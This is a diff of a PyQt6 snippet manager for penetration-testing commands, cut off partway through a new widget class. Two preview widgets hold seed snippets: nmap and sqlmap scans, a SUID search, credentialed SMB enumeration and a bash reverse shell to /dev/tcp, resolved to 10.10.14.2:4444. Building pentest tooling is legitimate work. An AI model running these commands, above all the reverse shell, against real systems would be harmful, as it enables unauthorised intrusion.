@@ -1,11 +1,12 @@
 import os,sqlite3,logging,json,re,html
 from datetime import datetime,timezone
 from logging.handlers import RotatingFileHandler
-from PyQt6.QtCore import Qt,QTimer,QPoint
-from PyQt6.QtGui import QAction,QFontMetrics
-from PyQt6.QtWidgets import QWidget,QVBoxLayout,QHBoxLayout,QFrame,QLineEdit,QComboBox,QToolButton,QStackedWidget,QTableWidget,QTableWidgetItem,QAbstractItemView,QHeaderView,QMenu,QApplication,QSizePolicy,QListWidget,QListWidgetItem,QSplitter,QLabel,QInputDialog,QMessageBox
+from PyQt6.QtCore import Qt,QTimer,QPoint,QSize
+from PyQt6.QtGui import QAction,QFontMetrics,QIcon
+from PyQt6.QtWidgets import QWidget,QVBoxLayout,QHBoxLayout,QFrame,QLineEdit,QComboBox,QToolButton,QStackedWidget,QTableWidget,QTableWidgetItem,QAbstractItemView,QHeaderView,QMenu,QApplication,QSizePolicy,QListWidget,QListWidgetItem,QSplitter,QLabel,QInputDialog,QMessageBox,QPlainTextEdit,QScrollArea
 from Cores import common_db as _common_db
 from Cores import note_refs as _note_refs
+from Cores import CommandRelated as _command_related
 def _abs(*p):return os.path.join(os.path.dirname(os.path.abspath(__file__)),*p)
 def _log_setup():
     d=_abs("..","Logs");os.makedirs(d,exist_ok=True)
@@ -102,7 +103,7 @@ def _load_cmds(dbp=None):
             for r in cur.fetchall():
                 rid=r[0];nn=r[1];c=r[2];sc=r[3];cmd=r[4];tags=r[5];desc=(r[6] if has_desc else "")
                 title=_norm(nn) or "Untitled"
-                out.append({"id":int(rid),"src":"CommandsNotes","group_name":"","title":title,"category":_norm(c) or "Uncategorized","sub":_norm(sc) or "General","command":_clean_cmd(cmd),"tags":_norm(tags),"description":_norm(desc)})
+                out.append({"id":int(rid),"src":"CommandsNotes","group_name":"","title":title,"cmd_note_title":title,"category":_norm(c) or "Uncategorized","sub":_norm(sc) or "General","command":_clean_cmd(cmd),"tags":_norm(tags),"description":_norm(desc)})
         cc=set(_table_cols(cur,"Commands"))
         if {"note_name","category","sub_category","command","tags"}.issubset(cc):
             has_desc="description" in cc
@@ -125,7 +126,7 @@ def _load_cmds(dbp=None):
                 title=_norm(ttl) or base
                 nid=_note_refs.note_ref_id(note_id=note_id)
                 grp=note_groups_by_id.get(nid,"") if nid is not None else note_groups_by_name.get(_norm(nn).lower(),"")
-                out.append({"id":int(rid),"src":"Commands","note_id":nid,"note_name":_norm(nn),"group_name":grp,"title":title,"category":_norm(c) or "Uncategorized","sub":_norm(sc) or "General","command":_clean_cmd(cmd),"tags":_norm(tags),"description":_norm(desc)})
+                out.append({"id":int(rid),"src":"Commands","note_id":nid,"note_name":_norm(nn),"group_name":grp,"title":title,"cmd_note_title":_norm(ttl),"category":_norm(c) or "Uncategorized","sub":_norm(sc) or "General","command":_clean_cmd(cmd),"tags":_norm(tags),"description":_norm(desc)})
         con.close()
         _log("[+]",f"Loaded search cmds: {len(out)} from {os.path.basename(p)}")
         return p,out
@@ -731,7 +732,7 @@ class Split_View_Style(QWidget):
             except:pass
         QTimer.singleShot(0,_fix)
         QTimer.singleShot(30,_fix)
-class Widget(QWidget):
+class LegacyWidget(QWidget):
     def __init__(self,parent=None):
         super().__init__(parent)
         self._db_path=None;self._db_mtime=None;self._notes=[];self._mode="Keyword";self._style="table"
@@ -1210,3 +1211,502 @@ class Widget(QWidget):
             QTimer.singleShot(30,self.split_style._fit_bars)
         _log("[*]",f"Style: {self._style}")
         if sync:self._apply_query()
+class SnippetPanelPreviewWidget(QWidget):
+    def __init__(self,parent=None):
+        super().__init__(parent)
+        self._items=self._seed_items();self._view=[];self._collection="All";self._selected_id=None
+        root=QVBoxLayout(self);root.setContentsMargins(0,0,0,0);root.setSpacing(0)
+        self.frame=QFrame(self);self.frame.setObjectName("SnippetPage");root.addWidget(self.frame,1)
+        v=QVBoxLayout(self.frame);v.setContentsMargins(10,10,10,10);v.setSpacing(10)
+        top=QHBoxLayout();top.setContentsMargins(4,0,4,0);top.setSpacing(10)
+        self.search=QLineEdit(self.frame);self.search.setObjectName("HomeSearch");self.search.setPlaceholderText("Search snippets, commands, tags, notes...")
+        self.cmb_scope=QComboBox(self.frame);self.cmb_scope.setObjectName("HomePerPage");self.cmb_scope.addItems(["Everything","Title","Command","Tags","Category"])
+        self.cmb_state=QComboBox(self.frame);self.cmb_state.setObjectName("HomePerPage");self.cmb_state.addItems(["All","Linked","Standalone","Has Placeholder","Missing Value"])
+        self.btn_view_list=self._btn("List",check=True);self.btn_view_table=self._btn("Table",check=True);self.btn_view_list.setChecked(True)
+        top.addWidget(self.search,1);top.addWidget(self.cmb_scope,0);top.addWidget(self.cmb_state,0);top.addWidget(self.btn_view_list,0);top.addWidget(self.btn_view_table,0)
+        v.addLayout(top,0)
+        self.split=QSplitter(Qt.Orientation.Horizontal,self.frame);self.split.setObjectName("SnippetSplit");self.split.setHandleWidth(0);self.split.setChildrenCollapsible(False)
+        v.addWidget(self.split,1)
+        self.side=QFrame(self.split);self.side.setObjectName("SnippetSide")
+        sv=QVBoxLayout(self.side);sv.setContentsMargins(10,10,10,10);sv.setSpacing(8)
+        sv.addWidget(self._label("Collections","SnippetSection"),0)
+        self.collection_buttons=[]
+        for name in ("All","Pinned","Recent","Most Used","Linked","Standalone","Missing Values"):
+            b=self._btn(name,check=True);b.clicked.connect(lambda chk=False,n=name:self._set_collection(n));self.collection_buttons.append(b);sv.addWidget(b,0)
+        sv.addSpacing(8);sv.addWidget(self._label("Quick Tags","SnippetSection"),0)
+        tag_row=QFrame(self.side);tag_row.setObjectName("SnippetChipWrap")
+        tv=QVBoxLayout(tag_row);tv.setContentsMargins(0,0,0,0);tv.setSpacing(6)
+        for tag in ("web","recon","linux","windows","sqli","shell"):
+            c=self._btn(tag,check=True);c.clicked.connect(lambda chk=False,t=tag:self._tag_search(t));tv.addWidget(c,0)
+        sv.addWidget(tag_row,0);sv.addStretch(1)
+        self.results_frame=QFrame(self.split);self.results_frame.setObjectName("SnippetResultsFrame")
+        rv=QVBoxLayout(self.results_frame);rv.setContentsMargins(10,10,10,10);rv.setSpacing(8)
+        rh=QHBoxLayout();rh.setContentsMargins(0,0,0,0);rh.setSpacing(8)
+        self.lbl_count=self._label("0 snippets","SnippetTitle")
+        self.btn_sort=QComboBox(self.results_frame);self.btn_sort.setObjectName("HomePerPage");self.btn_sort.addItems(["Best Match","Recently Used","Most Copied","Title"])
+        rh.addWidget(self.lbl_count,1);rh.addWidget(self.btn_sort,0)
+        self.results=QListWidget(self.results_frame);self.results.setObjectName("SnippetResults");self.results.setSelectionMode(QAbstractItemView.SelectionMode.SingleSelection);self.results.itemClicked.connect(self._on_item)
+        rv.addLayout(rh,0);rv.addWidget(self.results,1)
+        self.viewer=QFrame(self.split);self.viewer.setObjectName("SnippetViewer")
+        vv=QVBoxLayout(self.viewer);vv.setContentsMargins(12,12,12,12);vv.setSpacing(10)
+        self.lbl_title=self._label("Select a snippet","SnippetViewerTitle");self.lbl_meta=self._label("","SnippetMeta")
+        mode=QHBoxLayout();mode.setSpacing(8)
+        self.btn_preview=self._btn("Preview",check=True);self.btn_raw=self._btn("Raw",check=True);self.btn_resolved=self._btn("Resolved",check=True);self.btn_preview.setChecked(True)
+        for b in (self.btn_preview,self.btn_raw,self.btn_resolved):mode.addWidget(b,0)
+        mode.addStretch(1)
+        self.command=QPlainTextEdit(self.viewer);self.command.setObjectName("SnippetCommand");self.command.setReadOnly(True)
+        self.placeholders=QFrame(self.viewer);self.placeholders.setObjectName("SnippetPlaceholders")
+        self.ph=QVBoxLayout(self.placeholders);self.ph.setContentsMargins(10,10,10,10);self.ph.setSpacing(6)
+        actions=QHBoxLayout();actions.setSpacing(8)
+        self.btn_copy=self._btn("Copy");self.btn_copy_raw=self._btn("Copy Raw");self.btn_copy_resolved=self._btn("Copy Resolved");self.btn_pin=self._btn("Pin");self.btn_edit=self._btn("Edit");self.btn_note=self._btn("Open Note")
+        for b in (self.btn_copy,self.btn_copy_raw,self.btn_copy_resolved,self.btn_pin,self.btn_edit,self.btn_note):actions.addWidget(b,0)
+        actions.addStretch(1)
+        self.lbl_status=self._label("UI preview mode. Logic integration comes next.","SnippetStatus")
+        vv.addWidget(self.lbl_title,0);vv.addWidget(self.lbl_meta,0);vv.addLayout(mode,0);vv.addWidget(self.command,1);vv.addWidget(self.placeholders,0);vv.addLayout(actions,0);vv.addWidget(self.lbl_status,0)
+        self.split.addWidget(self.side);self.split.addWidget(self.results_frame);self.split.addWidget(self.viewer)
+        self.split.setStretchFactor(0,0);self.split.setStretchFactor(1,1);self.split.setStretchFactor(2,1)
+        try:self.split.setSizes([220,430,520])
+        except Exception:pass
+        self.search.textChanged.connect(self._apply);self.cmb_scope.currentTextChanged.connect(self._apply);self.cmb_state.currentTextChanged.connect(self._apply);self.btn_sort.currentTextChanged.connect(self._apply)
+        self.btn_view_list.clicked.connect(lambda:self._set_view("list"));self.btn_view_table.clicked.connect(lambda:self._set_view("table"))
+        self.btn_preview.clicked.connect(lambda:self._set_mode("preview"));self.btn_raw.clicked.connect(lambda:self._set_mode("raw"));self.btn_resolved.clicked.connect(lambda:self._set_mode("resolved"))
+        self.btn_copy.clicked.connect(lambda:self._copy("preview"));self.btn_copy_raw.clicked.connect(lambda:self._copy("raw"));self.btn_copy_resolved.clicked.connect(lambda:self._copy("resolved"));self.btn_pin.clicked.connect(self._pin_current)
+        self._set_collection("All")
+        _log("[+]",f"SearchCore preview UI ready")
+    def _seed_items(self):
+        return [
+            {"id":"nmap_fast","title":"Nmap Fast Scan","src":"Linked","note":"Recon Basics","cat":"recon","sub":"ports","tags":["nmap","recon","tcp"],"cmd":"nmap -sV -sC -T4 {TARGET_IP}","resolved":"nmap -sV -sC -T4 10.10.10.5","desc":"Fast service discovery against the live target.","pin":True,"count":42,"recent":1,"missing":[]},
+            {"id":"web_headers","title":"Curl Headers","src":"Standalone","note":"","cat":"web","sub":"headers","tags":["web","curl","headers"],"cmd":"curl -I {URL}","resolved":"curl -I https://target.local","desc":"Quick response headers check.","pin":False,"count":18,"recent":2,"missing":[]},
+            {"id":"sqlmap_basic","title":"SQLMap Basic","src":"Linked","note":"SQL Injection","cat":"web","sub":"sqli","tags":["web","sqli","sqlmap"],"cmd":"sqlmap -u \"{URL}\" --batch --risk=2 --level=3","resolved":"sqlmap -u \"https://target.local/item?id=1\" --batch --risk=2 --level=3","desc":"Baseline SQL injection test with safe defaults.","pin":True,"count":27,"recent":3,"missing":[]},
+            {"id":"lin_find_suid","title":"Linux SUID Find","src":"Standalone","note":"","cat":"linux","sub":"privilege","tags":["linux","privesc","find"],"cmd":"find / -perm -4000 -type f 2>/dev/null","resolved":"find / -perm -4000 -type f 2>/dev/null","desc":"Find SUID binaries on Linux.","pin":False,"count":31,"recent":6,"missing":[]},
+            {"id":"win_shares","title":"Windows SMB Shares","src":"Linked","note":"Windows Enumeration","cat":"windows","sub":"smb","tags":["windows","smb","netexec"],"cmd":"netexec smb {TARGET_IP} -u {USER} -p {PASS} --shares","resolved":"netexec smb 10.10.10.5 -u {USER} -p {PASS} --shares","desc":"List SMB shares using supplied credentials.","pin":False,"count":12,"recent":4,"missing":["USER","PASS"]},
+            {"id":"reverse_shell","title":"Bash Reverse Shell","src":"Standalone","note":"","cat":"shell","sub":"linux","tags":["shell","linux","bash"],"cmd":"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'","resolved":"bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'","desc":"Compact bash reverse shell payload.","pin":False,"count":55,"recent":5,"missing":[]}
+        ]
+    def _btn(self,text,check=False):
+        b=QToolButton(self.frame);b.setObjectName("SnippetBtn");b.setCursor(Qt.CursorShape.PointingHandCursor);b.setText(text);b.setCheckable(bool(check));return b
+    def _label(self,text,obj):
+        l=QLabel(text,self.frame);l.setObjectName(obj);l.setWordWrap(True);return l
+    def _tag_search(self,tag):
+        self.search.setText(tag);self.cmb_scope.setCurrentText("Tags")
+    def _set_collection(self,name):
+        self._collection=name
+        for b in self.collection_buttons:b.setChecked(b.text()==name)
+        self._apply()
+    def _set_view(self,name):
+        self.btn_view_list.setChecked(name=="list");self.btn_view_table.setChecked(name=="table")
+        self.lbl_status.setText("Table view is a planned alternate layout in this UI preview." if name=="table" else "List view selected.")
+    def _set_mode(self,name):
+        for b,n in ((self.btn_preview,"preview"),(self.btn_raw,"raw"),(self.btn_resolved,"resolved")):b.setChecked(n==name)
+        self._show(self._current())
+    def _current_mode(self):
+        if self.btn_raw.isChecked():return "raw"
+        if self.btn_resolved.isChecked():return "resolved"
+        return "preview"
+    def _current(self):
+        for n in self._items:
+            if n.get("id")==self._selected_id:return n
+        return self._view[0] if self._view else None
+    def _matches(self,n):
+        q=_l(self.search.text());scope=self.cmb_scope.currentText();state=self.cmb_state.currentText()
+        if self._collection=="Pinned" and not n.get("pin"):return False
+        if self._collection=="Linked" and n.get("src")!="Linked":return False
+        if self._collection=="Standalone" and n.get("src")!="Standalone":return False
+        if self._collection=="Missing Values" and not n.get("missing"):return False
+        if state=="Linked" and n.get("src")!="Linked":return False
+        if state=="Standalone" and n.get("src")!="Standalone":return False
+        if state=="Has Placeholder" and "{" not in n.get("cmd",""):return False
+        if state=="Missing Value" and not n.get("missing"):return False
+        if not q:return True
+        data={"Title":n.get("title",""),"Command":n.get("cmd",""),"Tags":" ".join(n.get("tags",[])),"Category":n.get("cat","")+" "+n.get("sub","")}
+        blob=data.get(scope," ".join([n.get("title",""),n.get("cmd","")," ".join(n.get("tags",[])),n.get("cat",""),n.get("sub",""),n.get("note",""),n.get("desc","")]))
+        return q in _l(blob)
+    def _apply(self,*_):
+        rows=[n for n in self._items if self._matches(n)]
+        sort=self.btn_sort.currentText()
+        if self._collection=="Recent" or sort=="Recently Used":rows.sort(key=lambda n:n.get("recent",999))
+        elif self._collection=="Most Used" or sort=="Most Copied":rows.sort(key=lambda n:-int(n.get("count",0)))
+        elif sort=="Title":rows.sort(key=lambda n:_l(n.get("title","")))
+        else:rows.sort(key=lambda n:(not n.get("pin"),n.get("recent",999),_l(n.get("title",""))))
+        self._view=rows;self.results.clear()
+        for n in rows:
+            it=QListWidgetItem(self._row_text(n));it.setData(Qt.ItemDataRole.UserRole,n.get("id"));it.setSizeHint(QSize(260,72));self.results.addItem(it)
+        self.lbl_count.setText(f"{len(rows)} snippets")
+        if rows:
+            idx=0
+            if self._selected_id:
+                for i,n in enumerate(rows):
+                    if n.get("id")==self._selected_id:idx=i;break
+            self.results.setCurrentRow(idx);self._selected_id=rows[idx].get("id");self._show(rows[idx])
+        else:
+            self._selected_id=None;self._show(None)
+    def _row_text(self,n):
+        pin="PIN " if n.get("pin") else ""
+        miss="  Missing: "+",".join(n.get("missing",[])) if n.get("missing") else ""
+        return f"{pin}{n.get('title','Untitled')}\n{n.get('cat','')} / {n.get('sub','')}   {', '.join(n.get('tags',[]))}{miss}\n{_ell(n.get('cmd',''),110)}"
+    def _on_item(self,item):
+        self._selected_id=item.data(Qt.ItemDataRole.UserRole);self._show(self._current())
+    def _clear_layout(self,lay):
+        while lay.count():
+            it=lay.takeAt(0);w=it.widget()
+            if w:w.setParent(None)
+    def _show(self,n):
+        self._clear_layout(self.ph)
+        if not n:
+            self.lbl_title.setText("No snippet selected");self.lbl_meta.setText("");self.command.clear();self.ph.addWidget(self._label("No placeholders","SnippetMeta"));return
+        self.lbl_title.setText(n.get("title","Untitled"))
+        self.lbl_meta.setText(f"{n.get('src','')} | {n.get('cat','')} / {n.get('sub','')} | copied {n.get('count',0)} times | note: {n.get('note','-') or '-'}")
+        mode=self._current_mode();text=n.get("resolved" if mode=="resolved" else "cmd","");self.command.setPlainText(text)
+        self.ph.addWidget(self._label("Placeholders","SnippetSection"),0)
+        keys=re.findall(r"\{([^{}]+)\}",n.get("cmd",""))
+        if not keys:self.ph.addWidget(self._label("No placeholders in this command.","SnippetMeta"),0)
+        for k in keys:
+            missing=k in (n.get("missing") or [])
+            val="{missing}" if missing else ("10.10.10.5" if "IP" in k else ("https://target.local" if "URL" in k else "ready"))
+            self.ph.addWidget(self._label(f"{k}: {val}","SnippetMissing" if missing else "SnippetMeta"),0)
+        self.lbl_status.setText(n.get("desc",""))
+    def _copy(self,mode):
+        n=self._current()
+        if not n:return
+        text=n.get("resolved" if mode=="resolved" else "cmd","")
+        QApplication.clipboard().setText(text);self.lbl_status.setText(f"Copied {mode}: {n.get('title','')}")
+    def _pin_current(self):
+        n=self._current()
+        if not n:return
+        n["pin"]=not bool(n.get("pin"));self.lbl_status.setText(("Pinned: " if n.get("pin") else "Unpinned: ")+n.get("title",""));self._apply()
+class SimpleSnippetPreviewWidget(QWidget):
+    def __init__(self,parent=None):
+        super().__init__(parent)
+        self._items=self._seed_items();self._expanded=set();self._filter="All";self._last_copied=""
+        root=QVBoxLayout(self);root.setContentsMargins(0,0,0,0);root.setSpacing(0)
+        self.frame=QFrame(self);self.frame.setObjectName("SimpleSnippetPage");root.addWidget(self.frame,1)
+        v=QVBoxLayout(self.frame);v.setContentsMargins(10,10,10,10);v.setSpacing(10)
+        top=QHBoxLayout();top.setContentsMargins(4,0,4,0);top.setSpacing(10)
+        self.search=QLineEdit(self.frame);self.search.setObjectName("HomeSearch");self.search.setPlaceholderText("Search snippets...")
+        self.mode=QComboBox(self.frame);self.mode.setObjectName("HomePerPage");self.mode.addItems(["All","Title","Command","Tag","Category"])
+        self.btn_all=self._top_btn("All");self.btn_pin=self._top_btn("Pinned");self.btn_recent=self._top_btn("Recent")
+        for b,n in ((self.btn_all,"All"),(self.btn_pin,"Pinned"),(self.btn_recent,"Recent")):b.clicked.connect(lambda chk=False,x=n:self._set_filter(x))
+        self.btn_all.setChecked(True)
+        top.addWidget(self.search,1);top.addWidget(self.mode,0);top.addWidget(self.btn_all,0);top.addWidget(self.btn_pin,0);top.addWidget(self.btn_recent,0)
+        self.status=QLabel("Click a card to expand. Double-click a card to copy resolved command.",self.frame);self.status.setObjectName("SimpleSnippetStatus")
+        self.scroll=QScrollArea(self.frame);self.scroll.setObjectName("SimpleSnippetScroll");self.scroll.setWidgetResizable(True);self.scroll.setHorizontalScrollBarPolicy(Qt.ScrollBarPolicy.ScrollBarAlwaysOff)
+        self.wrap=QFrame(self.scroll);self.wrap.setObjectName("SimpleSnippetWrap")
+        self.list=QVBoxLayout(self.wrap);self.list.setContentsMargins(0,0,0,0);self.list.setSpacing(8)
+        self.scroll.setWidget(self.wrap)
+        v.addLayout(top,0);v.addWidget(self.status,0);v.addWidget(self.scroll,1)
+        self.search.textChanged.connect(self._render);self.mode.currentTextChanged.connect(self._render)
+        self._render()
+        _log("[+]",f"Simple snippets preview UI ready")
+    def _seed_items(self):
+        return [
+            {"id":"nmap_fast","title":"Nmap Fast Scan","cat":"recon","sub":"ports","tags":["nmap","tcp","target"],"cmd":"nmap -sV -sC -T4 {TARGET_IP}","resolved":"nmap -sV -sC -T4 10.10.10.5","desc":"Fast service discovery against the live target.","pin":True,"recent":1},
+            {"id":"sqlmap_basic","title":"SQLMap Basic","cat":"web","sub":"sqli","tags":["sqlmap","sqli","url"],"cmd":"sqlmap -u \"{URL}\" --batch --risk=2 --level=3","resolved":"sqlmap -u \"https://target.local/item?id=1\" --batch --risk=2 --level=3","desc":"Baseline SQL injection test with common options.","pin":True,"recent":3},
+            {"id":"curl_headers","title":"Curl Headers","cat":"web","sub":"headers","tags":["curl","headers"],"cmd":"curl -I {URL}","resolved":"curl -I https://target.local","desc":"Quick header check for a web target.","pin":False,"recent":2},
+            {"id":"linux_suid","title":"Linux SUID Find","cat":"linux","sub":"privesc","tags":["linux","find","suid"],"cmd":"find / -perm -4000 -type f 2>/dev/null","resolved":"find / -perm -4000 -type f 2>/dev/null","desc":"Find SUID binaries on Linux.","pin":False,"recent":5},
+            {"id":"smb_shares","title":"Windows SMB Shares","cat":"windows","sub":"smb","tags":["windows","smb","netexec"],"cmd":"netexec smb {TARGET_IP} -u {USER} -p {PASS} --shares","resolved":"netexec smb 10.10.10.5 -u {USER} -p {PASS} --shares","desc":"List SMB shares. USER and PASS stay unresolved in this preview.","pin":False,"recent":4},
+            {"id":"bash_reverse","title":"Bash Reverse Shell","cat":"shell","sub":"linux","tags":["shell","bash","linux"],"cmd":"bash -c 'bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1'","resolved":"bash -c 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1'","desc":"Compact bash reverse shell payload.","pin":False,"recent":6}
+        ]
+    def _top_btn(self,text):
+        b=QToolButton(self.frame);b.setObjectName("SimpleSnippetTopBtn");b.setCursor(Qt.CursorShape.PointingHandCursor);b.setText(text);b.setCheckable(True);return b
+    def _btn(self,text):
+        b=QToolButton(self.frame);b.setObjectName("SimpleSnippetBtn");b.setCursor(Qt.CursorShape.PointingHandCursor);b.setText(text);return b
+    def _lbl(self,text,obj):
+        l=QLabel(text,self.frame);l.setObjectName(obj);l.setWordWrap(True);return l
+    def _clear(self):
+        while self.list.count():
+            it=self.list.takeAt(0);w=it.widget()
+            if w:w.setParent(None)
+    def _set_filter(self,name):
+        self._filter=name
+        for b,n in ((self.btn_all,"All"),(self.btn_pin,"Pinned"),(self.btn_recent,"Recent")):b.setChecked(n==name)
+        self._render()
+    def _matches(self,n):
+        if self._filter=="Pinned" and not n.get("pin"):return False
+        q=_l(self.search.text())
+        if not q:return True
+        mode=self.mode.currentText()
+        vals={"Title":n.get("title",""),"Command":n.get("cmd",""),"Tag":" ".join(n.get("tags",[])),"Category":n.get("cat","")+" "+n.get("sub","")}
+        blob=vals.get(mode," ".join([n.get("title",""),n.get("cmd","")," ".join(n.get("tags",[])),n.get("cat",""),n.get("sub",""),n.get("desc","")]))
+        return q in _l(blob)
+    def _rows(self):
+        rows=[n for n in self._items if self._matches(n)]
+        if self._filter=="Recent":rows.sort(key=lambda n:n.get("recent",999))
+        else:rows.sort(key=lambda n:(not n.get("pin"),n.get("recent",999),_l(n.get("title",""))))
+        return rows
+    def _render(self,*_):
+        self._clear()
+        rows=self._rows()
+        for n in rows:self.list.addWidget(self._card(n),0)
+        self.list.addStretch(1)
+        self.status.setText(f"{len(rows)} snippets. Click a card to expand, double-click to copy resolved command." if not self._last_copied else self._last_copied)
+    def _card(self,n):
+        box=QFrame(self.wrap);box.setObjectName("SimpleSnippetCard");box.setCursor(Qt.CursorShape.PointingHandCursor)
+        v=QVBoxLayout(box);v.setContentsMargins(12,10,12,10);v.setSpacing(7)
+        top=QHBoxLayout();top.setSpacing(8)
+        title=self._lbl(("PIN " if n.get("pin") else "")+n.get("title","Untitled"),"SimpleSnippetTitle")
+        copy=self._btn("Copy");copy.clicked.connect(lambda chk=False,x=n:self._copy(x,"resolved"))
+        top.addWidget(title,1);top.addWidget(copy,0)
+        meta=self._lbl(f"{n.get('cat','')} / {n.get('sub','')}    {', '.join(n.get('tags',[]))}","SimpleSnippetMeta")
+        cmd=self._lbl(n.get("cmd",""),"SimpleSnippetCommand")
+        v.addLayout(top,0);v.addWidget(meta,0);v.addWidget(cmd,0)
+        if n.get("id") in self._expanded:
+            detail=self._lbl(n.get("desc",""),"SimpleSnippetDetail")
+            ph=self._lbl("Placeholders: "+(", ".join(re.findall(r"\{([^{}]+)\}",n.get("cmd",""))) or "none"),"SimpleSnippetMeta")
+            act=QHBoxLayout();act.setSpacing(8)
+            b1=self._btn("Copy");b2=self._btn("Copy Raw");b3=self._btn("Edit");b4=self._btn("Pin" if not n.get("pin") else "Unpin")
+            b1.clicked.connect(lambda chk=False,x=n:self._copy(x,"resolved"));b2.clicked.connect(lambda chk=False,x=n:self._copy(x,"raw"));b3.clicked.connect(lambda chk=False,x=n:self._set_status(f"Edit preview: {x.get('title','')}"));b4.clicked.connect(lambda chk=False,x=n:self._pin(x))
+            for b in (b1,b2,b3,b4):act.addWidget(b,0)
+            act.addStretch(1)
+            v.addWidget(detail,0);v.addWidget(ph,0);v.addLayout(act,0)
+        box.mousePressEvent=lambda e,x=n:self._toggle(x)
+        box.mouseDoubleClickEvent=lambda e,x=n:self._copy(x,"resolved")
+        return box
+    def _toggle(self,n):
+        k=n.get("id")
+        if k in self._expanded:self._expanded.remove(k)
+        else:self._expanded.add(k)
+        self._render()
+    def _copy(self,n,mode):
+        text=n.get("cmd" if mode=="raw" else "resolved","")
+        QApplication.clipboard().setText(text)
+        self._last_copied=f"Copied {mode}: {n.get('title','')}"
+        self.status.setText(self._last_copied)
+    def _set_status(self,text):
+        self._last_copied=text;self.status.setText(text)
+    def _pin(self,n):
+        n["pin"]=not bool(n.get("pin"))
+        self._last_copied=("Pinned: " if n.get("pin") else "Unpinned: ")+n.get("title","")
+        self._render()
+class Widget(QWidget):
+    def __init__(self,parent=None):
+        super().__init__(parent)
+        self._db_path=None;self._db_mtime=None;self._cmds=[];self._view=[];self._sort_mode="A -> Z"
+        favs,only=self._load_favorites()
+        self._favorites=set(favs);self._favorites_only=bool(only)
+        self._fav_icon=None;self._fav_icon_on=None;self._load_icons()
+        self.ctx=LiveTargetContext();self.rep=CommandReplacer(self.ctx)
+        root=QVBoxLayout(self);root.setContentsMargins(0,0,0,0);root.setSpacing(0)
+        self.frame=QFrame(self);self.frame.setObjectName("CommandsNotesFrame");root.addWidget(self.frame,1)
+        v=QVBoxLayout(self.frame);v.setContentsMargins(10,10,10,10);v.setSpacing(10)
+        top=QHBoxLayout();top.setContentsMargins(14,8,14,0);top.setSpacing(10)
+        self.search=QLineEdit(self.frame);self.search.setObjectName("TargetSearch");self.search.setPlaceholderText("Search snippets...")
+        self.search.setMinimumHeight(30);self.search.setMaximumHeight(30);self.search.textChanged.connect(self._on_search)
+        self.btn_sort=QToolButton(self.frame);self.btn_sort.setObjectName("MiniFilterBtn");self.btn_sort.setCursor(Qt.CursorShape.PointingHandCursor);self.btn_sort.setPopupMode(QToolButton.ToolButtonPopupMode.InstantPopup);self.btn_sort.setText("Sort By");self.btn_sort.setMinimumHeight(30);self.btn_sort.setMaximumHeight(30)
+        sm=QMenu(self.btn_sort)
+        for text,mode in (("Sort By A -> Z","A -> Z"),("Sort By Z -> A","Z -> A"),("Sort By Newest","Newest"),("Fav First","Fav First")):
+            a=QAction(text,self);a.triggered.connect(lambda checked=False,m=mode:self._set_sort_mode(m));sm.addAction(a)
+        self.btn_sort.setMenu(sm)
+        self.btn_fav=QToolButton(self.frame);self.btn_fav.setObjectName("MiniFilterBtn");self.btn_fav.setCursor(Qt.CursorShape.PointingHandCursor);self.btn_fav.setCheckable(True);self.btn_fav.setChecked(self._favorites_only);self.btn_fav.setText("Favorites");self.btn_fav.setMinimumHeight(30);self.btn_fav.setMaximumHeight(30);self.btn_fav.clicked.connect(self._on_favorites)
+        fm=QFontMetrics(self.btn_fav.font());self.btn_fav.setFixedWidth(max(120,fm.horizontalAdvance("Favorites")+38))
+        self.btn_sort.setFixedWidth(max(110,fm.horizontalAdvance("Sort By")+38))
+        top.addWidget(self.search,1);top.addWidget(self.btn_sort,0);top.addWidget(self.btn_fav,0)
+        self.tbl_wrap=QFrame(self.frame);self.tbl_wrap.setObjectName("TargetTableFrame")
+        tw=QVBoxLayout(self.tbl_wrap);tw.setContentsMargins(10,10,10,10);tw.setSpacing(10)
+        self.table=QTableWidget(self.tbl_wrap);self.table.setObjectName("MiniCmdTable")
+        self.table.setColumnCount(4)
+        self.table.setHorizontalHeaderLabels(["Fav","Category","Sub Category","Command"])
+        self.table.verticalHeader().setVisible(False)
+        self.table.horizontalHeader().setVisible(False)
+        self.table.setEditTriggers(QTableWidget.EditTrigger.NoEditTriggers)
+        self.table.setSelectionBehavior(QTableWidget.SelectionBehavior.SelectRows)
+        self.table.setSelectionMode(QTableWidget.SelectionMode.SingleSelection)
+        self.table.setSortingEnabled(False);self.table.setAlternatingRowColors(False);self.table.setShowGrid(True);self.table.setWordWrap(True);self.table.setTextElideMode(Qt.TextElideMode.ElideNone)
+        self.table.cellClicked.connect(self._on_cell_click);self.table.cellDoubleClicked.connect(self._on_cell_double)
+        self.table.setContextMenuPolicy(Qt.ContextMenuPolicy.CustomContextMenu);self.table.customContextMenuRequested.connect(self._ctx_menu)
+        h=self.table.horizontalHeader();h.setSectionResizeMode(0,QHeaderView.ResizeMode.Fixed);h.setSectionResizeMode(1,QHeaderView.ResizeMode.Fixed);h.setSectionResizeMode(2,QHeaderView.ResizeMode.Fixed);h.setSectionResizeMode(3,QHeaderView.ResizeMode.Stretch)
+        self.table.setColumnWidth(0,30);self.table.setColumnWidth(1,150);self.table.setColumnWidth(2,150)
+        tw.addWidget(self.table,1)
+        self.pager=QFrame(self.tbl_wrap);self.pager.setObjectName("CommandsPagerFrame");self.pager.setVisible(False)
+        ph=QHBoxLayout(self.pager);ph.setContentsMargins(0,0,0,0);ph.setSpacing(10)
+        self.pager_left=QWidget(self.pager);self.pager_left.setFixedWidth(150)
+        left=QHBoxLayout(self.pager_left);left.setContentsMargins(0,0,0,0);left.setSpacing(0)
+        self.lbl_total=QLabel("",self.pager_left);self.lbl_total.setObjectName("CommandsTotal");left.addWidget(self.lbl_total,0,Qt.AlignmentFlag.AlignLeft|Qt.AlignmentFlag.AlignVCenter)
+        mid=QHBoxLayout();mid.setContentsMargins(0,0,0,0);mid.setSpacing(8)
+        self.btn_prev=QToolButton(self.pager);self.btn_prev.setObjectName("CommandsPagePrev");self.btn_prev.setCursor(Qt.CursorShape.PointingHandCursor);self.btn_prev.setText("<")
+        self.btn_next=QToolButton(self.pager);self.btn_next.setObjectName("CommandsPageNext");self.btn_next.setCursor(Qt.CursorShape.PointingHandCursor);self.btn_next.setText(">")
